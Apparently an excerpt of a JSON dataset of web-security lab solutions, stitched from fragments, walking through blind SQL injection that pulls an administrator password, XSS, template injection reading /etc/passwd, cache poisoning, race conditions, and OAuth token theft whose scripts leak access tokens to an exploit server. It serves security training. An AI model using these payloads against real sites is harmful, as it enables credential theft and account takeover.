                "solution": "Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.\nModify the TrackingId cookie, changing it to:\nTrackingId=xyz' AND '1'='1\nVerify that the Welcome back message appears in the response.\nNow change it to:\nTrackingId=xyz' AND '1'='2\nVerify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.\nNow change it to:\nTrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a\nVerify that the condition is true, confirming that there is a table called users.\nNow change it to:\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a\nVerify that the condition is true, confirming that there is a user called administrator.\nThe next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a\nThis condition should be true, confirming that the password is greater than 1 character in length.\nSend a series of follow-up values to test different password lengths. Send:\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a\nThen send:\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a\nAnd so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.\nAfter determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.\nIn Burp Intruder, change the value of the cookie to:\nTrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a\nThis uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.\nPlace payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add \u00a7 button. You should then see the following as the cookie value (note the payload position markers):\nTrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='\u00a7a\u00a7\nTo test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.\nTo be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.\nLaunch the attack by clicking the Start attack button.\nReview the attack results to find the value of the character at the first position. You should see a column in the results called Welcome back. One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.\nNow, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the Intruder tab, and change the specified offset from 1 to 2. You should then see the following as the cookie value:\nTrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a\nLaunch the modified attack, review the results, and note the character at the second offset.\nContinue this process testing offset 3, 4, and so on, until you have the whole password.\nIn the browser, click My account to open the login page. Use the password to log in as the administrator user.\nNote\nFor more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the cluster bomb attack type, and work through all permutations of offsets and character values."

                "solution": "Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.\nModify the TrackingId cookie, appending a single quotation mark to it:\nTrackingId=xyz'\nVerify that an error message is received.\nNow change it to two quotation marks:\nTrackingId=xyz''\nVerify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.\nYou now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:\nTrackingId=xyz'||(SELECT '')||'\nIn this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:\nTrackingId=xyz'||(SELECT '' FROM dual)||'\nAs you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.\nNow that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:\nTrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'\nThis time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.\nAs long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:\nTrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'\nAs this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.\nYou can also exploit this behavior to test conditions. First, submit the following query:\nTrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'\nVerify that an error message is received.\nNow change it to:\nTrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'\nVerify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.\nYou can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:\nTrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\nVerify that the condition is true (the error is received), confirming that there is a user called administrator.\nThe next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:\nTrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'\nThis condition should be true, confirming that the password is greater than 1 character in length.\nSend a series of follow-up values to test different password lengths. Send:\nTrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\nThen send:\nTrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\nAnd so on.

Our attack will cycle through each position and possible value, testing each one in turn.\nPlace payload position markers around the final a character in the cookie value. To do this, select just the a, and click the \"Add \u00a7\" button.

You can assume that the password contains only lowercase alphanumeric characters. In the \"Payloads\" side panel, check that \"Simple list\" is selected, and under \"Payload configuration\" add the payloads in the range a - z and 0 - 9. You can select these easily using the \"Add from list\" drop-down.\nLaunch the attack by clicking the \" Start attack\" button.\nReview the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The \"Status\" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.\nNow, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the original Intruder tab, and change the specified offset from 1 to 2.

However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
                "solution": "Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.\nModify the TrackingId cookie, changing it to:\nTrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--\nVerify that the application takes 10 seconds to respond.\nNow change it to:\nTrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--\nVerify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.\nNow change it to:\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nVerify that the condition is true, confirming that there is a user called administrator.\nThe next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nThis condition should be true, confirming that the password is greater than 1 character in length.\nSend a series of follow-up values to test different password lengths. Send:\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nThen send:\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nAnd so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.\nAfter determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.\nIn Burp Intruder, change the value of the cookie to:\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nThis uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.\nPlace payload position markers around the a character in the cookie value. To do this, select just the a, and click the Add \u00a7 button. You should then see the following as the cookie value (note the payload position markers):\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='\u00a7a\u00a7')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nTo test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down.\nTo be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the Resource pool tab to open the Resource pool side panel and add the attack to a resource pool with the Maximum concurrent requests set to 1.\nLaunch the attack by clicking the Start attack button.\nReview the attack results to find the value of the character at the first position. You should see a column in the results called Response received. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.\nNow, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the specified offset from 1 to 2. You should then see the following as the cookie value:\nTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='\u00a7a\u00a7')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\nLaunch the modified attack, review the results, and note the character at the second offset.\nContinue this process testing offset 3, 4, and so on, until you have the whole password.\nIn the browser, click My account to open the login page.

                "solution": "In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.\nBack in the lab, go to the target website and use the search bar to search for a random test string, such as \"XSS\".\nReturn to the Proxy tool in Burp Suite and forward the request.\nOn the Intercept tab, notice that the string is reflected in a JSON response called search-results.\nFrom the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call.\nBy experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.\nTo solve this lab, enter the following search term:\n\\\"-alert(1)}//\nAs you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.\nAn arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:\n{\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}"

The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID \"x\", which is the form we created inside the comment. The onfocus event handler then calls the print() function."

You will need this later.\nUpload a valid image as your avatar and load the page containing your test comment.\nIn Burp Repeater, open the POST request for changing your preferred name and use the blog-post-author-display parameter to set an arbitrary file as your avatar:\nuser.setAvatar('/etc/passwd')\nLoad the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template:\nuser.setAvatar('/etc/passwd','image/jpg')\nTo read the file, load the avatar using GET /avatar?avatar=wiener. This will return the contents of the /etc/passwd file, confirming that you have access to arbitrary files.\nRepeat this process to read the PHP file that you noted down earlier:\nuser.setAvatar('/home/carlos/User.php','image/jpg')\nIn the PHP file, Notice that you have access to the gdprDelete() function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.\nFirst set the target file as your avatar, then view the comment to execute the template:\nuser.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')\nInvoke the user.gdprDelete() method and view your comment again to solve the lab."

As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.\nIn Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es. The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1.\nSend the GET request for the home page to Burp Repeater and add a cache buster.\nObserve that the X-Original-URL can be used to change the path of the request, so you can explicitly set /setlang/es. However, you will find that this response cannot be cached because it contains the Set-Cookie header.\nObserve that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, X-Original-URL: /setlang\\es triggers a 302 response that redirects to /setlang/es. Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.\nYou now need to combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.\nNow, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\\es to force all users to the Spanish page.\nTo simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.\nReplay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved."

However, most of the time, you will see that the URL for the canonical link element and the analytics.js import now both point to your exploit server, but the geolocate.js import URL remains the same.\nKeep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache.

Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header.\nGo to the exploit server and create a file at /js/geolocate.js containing the payload alert(document.cookie). Store the exploit.\nBack in Burp Repeater, disable the dynamic cache buster in the query string and re-add the X-Forwarded-Host header to point to your exploit server.\nSend the request over and over until all three of the dynamic URLs in the response point to your exploit server.

Send the GET /me request to Burp Repeater.\nLog out of your account and log back in again. From the proxy history, find the most recent GET /auth?client_id=[...] request and send it to Repeater.\nIn Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ path traversal sequence.\nLog out of your account on the blog website and turn on proxy interception in Burp.\nIn the browser, log in again and go to the intercepted GET /auth?client_id=[...] request in Burp Proxy.\nConfirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to:\nhttps://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1\nForward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.\nWith the help of Burp, audit the other pages on the blog website. Identify the \"Next post\" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding GET /post/next?path=[...] request to Repeater.\nIn Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.\nCraft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to your exploit server:\nhttps://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email\nTest that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's \"Hello, world!\" page, along with the access token in a URL fragment.\nOn the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:\n<script>\nwindow.location = '/?'+document.location.hash.substr(1)\n</script>\nTo test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for GET /?access_token=[...].\nYou now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:\n<script>\n    if (!document.location.hash) {\n        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'\n    } else {\n        window.location = '/?'+document.location.hash.substr(1)\n    }\n</script>\nTo test that the exploit works, store it and then click \"View exploit\". The page should appear to refresh, but if you check the access log, you should see a new request for GET /?access_token=[...].\nDeliver the exploit to the victim, then copy their access token from the log.\nIn Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request.

Observe that the comment form is included as an iframe on each blog post. Look closer at the /post/comment/comment-form page in Burp and notice that it uses the postMessage() method to send the window.location.href property to its parent window. Crucially, it allows messages to be posted to any origin (*).\nFrom the proxy history, right-click on the GET /auth?client_id=[...] request and select \"Copy URL\". Go to the exploit server and create an iframe in which the src attribute is the URL you just copied. Use directory traversal to change the redirect_uri so that it points to the comment form.

The query string of this link includes your username and a token.\nSend the POST /forgot-password request to Burp Repeater.\nIn Repeater, send the request a few times, then check your inbox again.\nObserve that every reset request results in a link with a different token.\nConsider the following:\nThe token is of a consistent length. This suggests that it's either a randomly generated string with a fixed number of characters, or could be a hash of some unknown data, which may be predictable.\nThe fact that the token is different each time indicates that, if it is in fact a hash digest, it must contain some kind of internal state, such as an RNG, a counter, or a timestamp.\nDuplicate the Repeater tab and add both tabs to a new group. For details on how to do this, see Creating a new tab group\nSend the pair of reset requests in parallel a few times. For details on how to do this, see Sending requests in parallel.\nObserve that there is still a significant delay between each response and that you still get a different token in each confirmation email. Infer that your requests are still being processed in sequence rather than concurrently.\nBypass the per-session locking restriction\nNotice that your session cookie suggests that the website uses a PHP back-end. This could mean that the server only processes one request at a time per session.\nSend the GET /forgot-password request to Burp Repeater, remove the session cookie from the request, then send it.\nFrom the response, copy the newly issued session cookie and CSRF token and use them to replace the respective values in one of the two POST /forgot-password requests. You now have a pair of password reset requests from two different sessions.\nSend the two POST requests in parallel a few times and observe that the processing times are now much more closely aligned, and sometimes identical.\nConfirm the vulnerability\nGo back to your inbox and notice that when the response times match for the pair of reset requests, this results in two confirmation emails that use an identical token. This confirms that a timestamp must be one of the inputs for the hash.\nConsider that this also means the token would be predictable if you knew the other inputs for the hash function.\nNotice the separate username parameter. This suggests that the username might not be included in the hash, which means that two different usernames could theoretically have the same token.\nIn Repeater, go to the pair of POST /forgot-password requests and change the username parameter in one of them to carlos.\nResend the two requests in parallel. If the attack worked, both users should be assigned the same reset token, although you won't be able to see this.\nCheck your inbox again and observe that, this time, you've only received one new confirmation email. Infer that the other email, hopefully containing the same token, has been sent to Carlos.\nCopy the link from the email and change the username in the query string to carlos.\nVisit the URL in the browser and observe that you're taken to the form for setting a new password as normal.\nSet the password to something you'll remember and submit the form.\nTry logging in as carlos using the password you just set.\nIf you can't log in, resend the pair of password reset emails and repeat the process.\nIf you successfully log in, visit the admin panel and delete the user carlos to solve the lab."

                "solution": "Predict a potential collision\nStudy the user registration mechanism. Observe that:\nYou can only register using @ginandjuice.shop email addresses.\nTo complete the registration, you need to visit the confirmation link, which is sent via email.\nAs you don't have access to an @ginandjuice.shop email account, you don't appear to have a way to access a valid confirmation link.\nIn Burp, from the proxy history, notice that there is a request to fetch /resources/static/users.js.\nStudy the JavaScript and notice that this dynamically generates a form for the confirmation page, which is presumably linked from the confirmation email. This leaks the fact that the final confirmation is submitted via a POST request to /confirm, with the token provided in the query string.\nIn Burp Repeater, create an equivalent request to what your browser might send when clicking the confirmation link. For example:\n    POST /confirm?token=1 HTTP/2\n    Host: YOUR-LAB-ID.web-security-academy.net\n    Content-Type: x-www-form-urlencoded\n    Content-Length: 0\n                            \nExperiment with the token parameter in your newly crafted confirmation request. Observe that:\nIf you submit an arbitrary token, you receive an Incorrect token: <YOUR-TOKEN> response.\nIf you remove the parameter altogether, you receive a Missing parameter: token response.\nIf you submit an empty token parameter, you receive a Forbidden response.\nConsider that this Forbidden response may indicate that the developers have patched a vulnerability that could be exploited by sending an empty token parameter.\nConsider that there may be a small race window between:\nWhen you submit a request to register a user.\nWhen the newly generated registration token is actually stored in the database.\nIf so, there may be a temporary sub-state in which null (or equivalent) is a valid token for confirming the user's registration.\nExperiment with different ways of submitting a token parameter with a value equivalent to null. For example, some frameworks let you to pass an empty array as follows:\n    POST /confirm?token[]=\n                            \nObserve that this time, instead of the Forbidden response, you receive an Invalid token: Array response. This shows that you've successfully passed in an empty array, which could potentially match an uninitialized registration token.\nBenchmark the behavior\nSend the POST /register request to Burp Repeater.\nIn Burp Repeater, experiment with the registration request. Observe that if you attempt to register the same username more than once, you get a different response.\nIn a separate Repeater tab, use what you've learned from the JavaScript import to construct a confirmation request with an arbitrary token. For example:\n    POST /confirm?token=1 HTTP/2\n    Host: YOUR-LAB-ID.web-security-academy.net\n    Cookie: phpsessionid=YOUR-SESSION-ID\n    Content-Type: application/x-www-form-urlencoded\n    Content-Length: 0\n                            \nAdd both requests to a new tab group.\nTry sending both requests sequentially and in parallel several times, making sure to change the username in the registration request each time to avoid hitting the separate Account already exists with this name code path. For details on how to do this, see Sending grouped HTTP requests.\nNotice that the confirmation response consistently arrives much quicker than the response to the registration request.\nProve the concept\nNote that you need the server to begin creating the pending user in the database, then compare the token you send in the confirmation request before the user creation is complete.\nConsider that as the confirmation response is always processed much more quickly, you need to delay this so that it falls within the race window.\nIn the POST /register request, highlight the value of the username parameter, then right-click and select Extensions > Turbo Intruder > Send to turbo intruder.\nIn Turbo Intruder, in the request editor:\nNotice that the value of the username parameter is automatically marked as a payload position with the %s placeholder.\nMake sure the email parameter is set to an arbitrary @ginandjuice.shop address that is not likely to already be registered on the site.\nMake a note of the static value of the password parameter. You'll need this later.\nFrom the drop-down menu, select the examples/race-single-packet-attack.py template.\nIn the Python editor, modify the main body of the template as follows:\nDefine a variable containing the confirmation request you've been testing in Repeater.\nCreate a loop that queues a single registration request using a new username for each attempt. Set the gate argument to match the current iteration.\nCreate a nested loop that queues a large number of confirmation requests for each attempt. These should also use the same release gate.\nOpen the gate for all the requests in each attempt at the same time.\nThe resulting script should look something like this:\ndef queueRequests(target, wordlists):\n\n    engine = RequestEngine(endpoint=target.endpoint,\n                            concurrentConnections=1,\n                            engine=Engine.BURP2\n                            )\n    \n    confirmationReq = '''POST /confirm?token[]= HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: phpsessionid=YOUR-SESSION-TOKEN\nContent-Length: 0\n\n'''\n    for attempt in range(20):\n        currentAttempt = str(attempt)\n        username = 'User' + currentAttempt\n    \n        # queue a single registration request\n        engine.queue(target.req, username, gate=currentAttempt)\n        \n        # queue 50 confirmation requests - note that this will probably sent in two separate packets\n        for i in range(50):\n            engine.queue(confirmationReq, gate=currentAttempt)\n        \n        # send all the queued requests for this attempt\n        engine.openGate(currentAttempt)\n\ndef handleResponse(req, interesting):\n    table.add(req)\n    \nLaunch the attack.\nIn the results table, sort the results by the Length column.\nIf the attack was successful, you should see one or more 200 responses to your confirmation request containing the message Account registration for user <USERNAME> successful.\nMake a note of the username from one of these responses. If you used the example script above, this will be something like User4.\nIn the browser, log in using this username and the static password you used in the registration request.\nAccess the admin panel and delete carlos to solve the lab."

The attack runs in a new window.\nWhen the attack finishes, sort the results by Status code. Notice that the #, ?, %23, and %3f characters receive a 200 response with your API key. This indicates that they're used by the origin server as path delimiters. Ignore the # character. It can't be used for an exploit as the victim's browser will use it as a delimiter before forwarding the request to the cache.\nInvestigate path delimiter discrepancies\nGo to the Repeater tab that contains the /my-accountabc request. Add the ? character after /my-account and add a static extension to the path. For example, update the path to /my-account?abc.js.\nSend the request.
